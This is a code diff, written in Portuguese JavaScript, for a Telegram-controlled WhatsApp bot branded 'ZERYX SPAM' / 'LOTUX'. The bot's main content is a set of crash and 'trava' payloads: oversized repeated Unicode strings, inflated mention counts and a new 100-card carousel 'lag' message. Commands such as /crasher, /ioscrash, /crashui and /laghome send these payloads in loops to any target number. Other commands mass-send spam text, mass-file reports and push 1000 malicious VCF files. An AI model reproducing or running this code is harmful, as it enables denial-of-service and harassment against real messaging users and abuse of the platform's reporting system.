@@ -10,7 +10,7 @@ const http = require('http');
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('Bot Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ Rodando 24 Horas!\n');
+    res.end('Bot Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ (LOTUX) Rodando 24 Horas!\n');
 }).listen(PORT, () => {
     console.log(`Servidor HTTP rodando na porta ${PORT}`);
 });
@@ -22,7 +22,6 @@ let waSock = null;
 let jaNotificouConectado = false;
 let reconectando = false;
 
-// Banco de dados em memória
 const dadosUsuarios = {}; 
 const configuracoesGrupos = {}; 
 const sessoesBrincadeira = {}; 
@@ -54,9 +53,9 @@ function baixarVCFGitHub() {
     });
 }
 
-// ==================== MÉTODOS DE TRAVAS / CRASH JSON (LOTUX) ====================
+// ==================== MÉTODOS DE TRAVAS E CRASH JSON (LOTUX) ====================
 
-// 1. Crash Chat / BlokWidget (Payload pesado com \u200d)
+// 1. Crash Chat / BlokWidget (Payload com repeat pesado)
 async function enviarTravaCrashChat(sock, jidAlvo) {
     const payloadJson = {
         viewOnceMessage: {
@@ -72,10 +71,10 @@ async function enviarTravaCrashChat(sock, jidAlvo) {
                             degreesLatitude: 0,
                             degreesLongitude: 0,
                             name: "Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ",
-                            address: "Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ"
+                            address: "LOTUX SYSTEM"
                         }
                     },
-                    body: { text: "⚡ [ZERYX-CRASH-CHAT] 💥" },
+                    body: { text: "⚡ [ZERYX-CRASH-CHAT] - LOTUX 💥" },
                     nativeFlowMessage: {
                         buttons: [
                             {
@@ -95,7 +94,7 @@ async function enviarTravaCrashChat(sock, jidAlvo) {
     await sock.relayMessage(jidAlvo, payloadJson, { participant: { jid: jidAlvo } });
 }
 
-// 2. Crash iOS / Buttons Message com caracteres nulos
+// 2. Crash iOS / Buttons Message
 async function enviarTravaIOS(sock, jidAlvo) {
     const payloadJson = {
         viewOnceMessage: {
@@ -104,12 +103,12 @@ async function enviarTravaIOS(sock, jidAlvo) {
                     locationMessage: {
                         degreesLatitude: 0,
                         degreesLongitude: 0,
-                        name: "\u0000".repeat(9000)
+                        name: "𑇂𑆵𑆴".repeat(3000)
                     },
                     buttons: [
                         {
                             buttonId: "lotux_uwu",
-                            buttonText: { displayText: "\u0000".repeat(1000) },
+                            buttonText: { displayText: "𑇂𑆵𑆴".repeat(500) },
                             type: "RESPONSE"
                         }
                     ],
@@ -121,12 +120,12 @@ async function enviarTravaIOS(sock, jidAlvo) {
     await sock.relayMessage(jidAlvo, payloadJson, { participant: { jid: jidAlvo } });
 }
 
-// 3. Crash UI / System UI (Baseado nos prints do Telegram)
+// 3. Crash UI / System UI (Baseado nos prints)
 async function enviarTravaCrashUI(sock, jidAlvo) {
     const payloadJson = {
         interactiveMessage: {
             body: {
-                text: "\u0000".repeat(300000)
+                text: "\u00a9".repeat(100000)
             },
             nativeFlowMessage: {
                 messageParamsJson: ""
@@ -135,10 +134,38 @@ async function enviarTravaCrashUI(sock, jidAlvo) {
                 uuid: "",
                 data: "",
                 type: "",
-                fallback: "</> Zeryx.js 🪐"
+                fallback: "</> Zeryx.js - LOTUX 🪐"
             },
             contextInfo: {
                 nonJidMentions: 9999
+            }
+        }
+    };
+    await sock.relayMessage(jidAlvo, payloadJson, { participant: { jid: jidAlvo } });
+}
+
+// 4. Lag Home / Delay Method
+async function enviarTravaLagHome(sock, jidAlvo) {
+    const payloadJson = {
+        viewOnceMessage: {
+            message: {
+                interactiveMessage: {
+                    body: { text: "⚡ LOTUX DELAY METHOD ⚡" },
+                    footer: { text: "Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ" },
+                    carouselMessage: {
+                        cards: Array(100).fill({
+                            header: {
+                                title: "\nㅤㅤ\n",
+                                hasMediaAttachment: false
+                            },
+                            body: { text: "LAG SYSTEM ACTIVE" },
+                            nativeFlowMessage: {
+                                buttons: [{ name: "cta_url", buttonParamsJson: "{\"display_text\":\"LOTUX\",\"url\":\"https://t.me\"}" }]
+                            }
+                        }),
+                        messageVersion: 1
+                    }
+                }
             }
         }
     };
@@ -170,7 +197,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
             reconectando = false;
             if (chatId && !jaNotificouConectado) {
                 jaNotificouConectado = true;
-                bot.sendMessage(chatId, "✅ **Conectado com sucesso ao WhatsApp!**", { parse_mode: 'Markdown' });
+                bot.sendMessage(chatId, "✅ **Conectado com sucesso ao WhatsApp (LOTUX)!**", { parse_mode: 'Markdown' });
             }
         }
     });
@@ -186,25 +213,71 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
             if (!texto) return;
             console.log(`Mensagem recebida de ${remoteJid}:${texto}`);
 
-            // MENU DO BOT COM A IDENTIDADE Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ
+            // MENU INTERATIVO AVANÇADO (ESTILO PAXLEY / ZERYX COM FOTO DO GITHUB)
             if (texto.trim() === '/menu') {
                 const numeroUsuario = remoteJid.split('@')[0];
-                const menuTexto = 
-                    `⚡ *Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ* - Painel do LOTUX ⚡\n\n` +
-                    `📱 *Usuário:* \`${numeroUsuario}\`\n` +
-                    `⭐ *Status:* PREMIUM ATTACK\n\n` +
-                    `┏━━━⧼🔥 COMANDOS DE TRAVAS JSON ⧽\n` +
-                    `> /crasher <número> <qtd> (Crash Chat JSON)\n` +
-                    `> /ioscrash <número> <qtd> (Crash iOS/Buttons)\n` +
-                    `> /crashui <número> <qtd> (Crash System UI)\n` +
-                    `> /5p4n <número> (1000 Travas VCF do GitHub)\n` +
-                    `> /SP4M <número> <qtd> (Spam de Texto)\n` +
-                    `> /B4N <número> <qtd> (Denúncias Nativas)\n` +
-                    `┗━━━━━━━━━━━━━━━━━━━━━━┛`;
-                
-                await waSock.sendMessage(remoteJid, { text: menuTexto });
+                const dataHoraAtual = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
+
+                const menuInterativo = {
+                    viewOnceMessage: {
+                        message: {
+                            interactiveMessage: {
+                                header: {
+                                    hasMediaAttachment: true,
+                                    imageMessage: {
+                                        url: "https://raw.githubusercontent.com/wv0304362-bot/ZRX-BANCEK-/main/menu.jpg",
+                                        mimetype: "image/jpeg",
+                                        caption: "⚡ *Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ* ⚡\n> _O poder absoluto nas mãos de LOTUX._\n> 「 ⓘ. Zeryx - System 」"
+                                    }
+                                },
+                                body: {
+                                    text: `📱 *Usuário:* \`${numeroUsuario}\` (LOTUX)\n🕒 *Horário:* ${dataHoraAtual}\n⭐ *Status:* PREMIUM ADMIN`
+                                },
+                                footer: {
+                                    text: "\n▢ ./Informação\n└──\n ├─ ▢ *Author*: *LOTUX*\n ├─ ▢ *Prefix*: *Multi*\n └─ *ZeryxSpam 🦠*\n"
+                                },
+                                nativeFlowMessage: {
+                                    buttons: [
+                                        {
+                                            name: "single_select",
+                                            buttonParamsJson: JSON.stringify({
+                                                icon: "DOCUMENT",
+                                                title: "🚀 Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐌𝐄𝐍𝐔 (LOTUX) 🚀",
+                                                sections: [
+                                                    {
+                                                        title: "Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ",
+                                                        rows: [
+                                                            { title: "⚡ /crasher <núm> <qtd>", id: "/crasher", description: "Crash Chat JSON" },
+                                                            { title: "🍏 /ioscrash <núm> <qtd>", id: "/ioscrash", description: "Crash iOS / Buttons" },
+                                                            { title: "💻 /crashui <núm> <qtd>", id: "/crashui", description: "Crash System UI" },
+                                                            { title: "🌀 /laghome <núm> <qtd>", id: "/laghome", description: "Lag Home / Delay" },
+                                                            { title: "📞 /5p4n <núm>", id: "/5p4n", description: "1000 Travas VCF do GitHub" },
+                                                            { title: "💬 /SP4M <núm> <qtd>", id: "/SP4M", description: "Spam de Texto" },
+                                                            { title: "🛡️ /B4N <núm> <qtd>", id: "/B4N", description: "Denúncias Nativas" },
+                                                            { title: "🧹 /limpar", id: "/limpar", description: "Limpar Sessão do Bot" }
+                                                        ]
+                                                    }
+                                                ]
+                                            })
+                                        },
+                                        {
+                                            name: "cta_url",
+                                            buttonParamsJson: JSON.stringify({
+                                                display_text: "🌐 Canal Oficial",
+                                                url: "https://whatsapp.com/channel/0029VbCvKL1Id7nDv6KoDH0S",
+                                                landing_page_url: "https://whatsapp.com/channel/0029VbCvKL1Id7nDv6KoDH0S"
+                                            })
+                                        }
+                                    ]
+                                }
+                            }
+                        }
+                    }
+                };
+
+                await waSock.sendMessage(remoteJid, menuInterativo);
             }
-            // COMANDO /crasher (Crash Chat)
+            // COMANDO /crasher
             else if (texto.startsWith('/crasher ')) {
                 const partes = texto.replace('/crasher', '').trim().split(' ');
                 const alvoNum = partes[0]?.replace(/\D/g, '');
@@ -216,7 +289,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 }
 
                 const jidAlvo = `${alvoNum}@s.whatsapp.net`;
-                await waSock.sendMessage(remoteJid, { text: `🚀 Disparando ${quantidade} travas Crash Chat JSON para \`${alvoNum}\` (LOTUX)...` });
+                await waSock.sendMessage(remoteJid, { text: `🚀 Disparando ${quantidade} travas Crash Chat para \`${alvoNum}\` (LOTUX)...` });
 
                 for (let i = 1; i <= quantidade; i++) {
                     try {
@@ -226,7 +299,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 }
                 await waSock.sendMessage(remoteJid, { text: `✅ Disparo Crash Chat concluído!` });
             }
-            // COMANDO /ioscrash (Crash iOS)
+            // COMANDO /ioscrash
             else if (texto.startsWith('/ioscrash ')) {
                 const partes = texto.replace('/ioscrash', '').trim().split(' ');
                 const alvoNum = partes[0]?.replace(/\D/g, '');
@@ -248,7 +321,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 }
                 await waSock.sendMessage(remoteJid, { text: `✅ Disparo Crash iOS concluído!` });
             }
-            // COMANDO /crashui (Crash System UI)
+            // COMANDO /crashui
             else if (texto.startsWith('/crashui ')) {
                 const partes = texto.replace('/crashui', '').trim().split(' ');
                 const alvoNum = partes[0]?.replace(/\D/g, '');
@@ -269,6 +342,28 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                     } catch (err) {}
                 }
                 await waSock.sendMessage(remoteJid, { text: `✅ Disparo Crash UI concluído!` });
+            }
+            // COMANDO /laghome
+            else if (texto.startsWith('/laghome ')) {
+                const partes = texto.replace('/laghome', '').trim().split(' ');
+                const alvoNum = partes[0]?.replace(/\D/g, '');
+                const quantidade = parseInt(partes[1]) || 3;
+
+                if (!alvoNum) {
+                    await waSock.sendMessage(remoteJid, { text: '❌ Uso correto: `/laghome <número> <quantidade>`' });
+                    return;
+                }
+
+                const jidAlvo = `${alvoNum}@s.whatsapp.net`;
+                await waSock.sendMessage(remoteJid, { text: `🌀 Disparando Lag Home / Delay para \`${alvoNum}\` (${quantidade}x)...` });
+
+                for (let i = 1; i <= quantidade; i++) {
+                    try {
+                        await enviarTravaLagHome(waSock, jidAlvo);
+                        await delay(1000);
+                    } catch (err) {}
+                }
+                await waSock.sendMessage(remoteJid, { text: `✅ Disparo Lag Home concluído!` });
             }
             // COMANDO /5p4n (1000 VCF DO GITHUB)
             else if (texto.startsWith('/5p4n ')) {
@@ -300,7 +395,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 }
                 await waSock.sendMessage(remoteJid, { text: `✅ 1000 Travas VCF enviadas com sucesso para \`${alvoNum}\`!` });
             }
-            // COMANDO SP4M DE TEXTO
+            // COMANDO SP4M
             else if (texto.startsWith('/SP4M ')) {
                 const partes = texto.replace('/SP4M', '').trim().split(' ');
                 const alvoNum = partes[0]?.replace(/\D/g, '');
@@ -329,7 +424,7 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
                 }
                 await waSock.sendMessage(remoteJid, { text: `✅ Disparo SP4M concluído!` });
             }
-            // COMANDO B4N (DENÚNCIAS NATIVAS)
+            // COMANDO B4N
             else if (texto.startsWith('/B4N ')) {
                 const partes = texto.replace('/B4N', '').trim().split(' ');
                 const alvoNum = partes[0]?.replace(/\D/g, '');
@@ -365,11 +460,32 @@ async function iniciarWhatsApp(chatId, numeroTelefone) {
         try {
             const codigo = await waSock.requestPairingCode(numeroTelefone);
             if (chatId) {
-                bot.sendMessage(chatId, `✅ **Código de Emparelhamento:**\n\`${codigo}\``, { parse_mode: 'Markdown' });
+                bot.sendMessage(chatId, `✅ **Código de Emparelhamento (LOTUX):**\n\`${codigo}\``, { parse_mode: 'Markdown' });
             }
         } catch (error) {}
     }
 }
+
+// COMANDOS DO TELEGRAM (INCLUINDO /limpar)
+bot.onText(/\/limpar|\/desconectar/, async (msg) => {
+    const chatId = msg.chat.id;
+    const pastaSessao = path.join(__dirname, 'sessao_teste');
+
+    try {
+        if (waSock) {
+            await waSock.logout().catch(() => {});
+            waSock = null;
+        }
+        if (fs.existsSync(pastaSessao)) {
+            fs.rmSync(pastaSessao, { recursive: true, force: true });
+        }
+        reconectando = false;
+        jaNotificouConectado = false;
+        bot.sendMessage(chatId, "🧹 **Sessão do WhatsApp limpa com sucesso!** Podes conectar novamente.", { parse_mode: 'Markdown' });
+    } catch (error) {
+        bot.sendMessage(chatId, "❌ Erro ao limpar a sessão.");
+    }
+});
 
 bot.onText(/\/conectar (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
@@ -380,7 +496,7 @@ bot.onText(/\/conectar (.+)/, async (msg, match) => {
 
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
-    bot.sendMessage(chatId, `🤖 *Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ SYSTEM* (LOTUX)\n\n• Para conectar: \`/conectar SEU_NUMERO\``, { parse_mode: 'Markdown' });
+    bot.sendMessage(chatId, `🤖 *Ϟ 𝐙⃯𝚵𝐑𝐘𝐗 𝐒𝐏⃯∆𝐌 Ϟ SYSTEM* (LOTUX)\n\n• Para conectar o WhatsApp: \`/conectar SEU_NUMERO\`\n• Para limpar a sessão: \`/limpar\``, { parse_mode: 'Markdown' });
 });
 
-console.log("Bot Telegram iniciado com as Travas JSON do LOTUX!");
+console.log("Bot Telegram iniciado com sucesso para o LOTUX!");
